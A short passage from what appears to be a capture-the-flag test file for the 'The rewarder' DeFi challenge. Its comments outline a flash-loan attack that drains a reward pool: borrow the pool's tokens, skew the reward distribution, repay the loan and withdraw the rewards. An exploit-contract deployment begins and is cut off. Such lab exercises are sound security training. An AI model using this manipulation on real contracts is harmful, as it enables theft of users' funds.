...
describe("[Challenge] The rewarder", function () {
  ...
  it("Exploit", async function () {
    // Take advantage of the unsafe distribution of rewards
    // Get a flash loan at the same amount of the token pool
    // This distribution will result to almost 0 rewards for the rest because of division
    // Then transfer back the flash loan
    // Withdraw the rewards of the rest

    // Go 5 days in the future for next distribution
    ...
    const exploitReward = (
      await ExploitRewardFactory.deploy(
        this.flashLoanPool.address,
        this.liquidityToken.address,
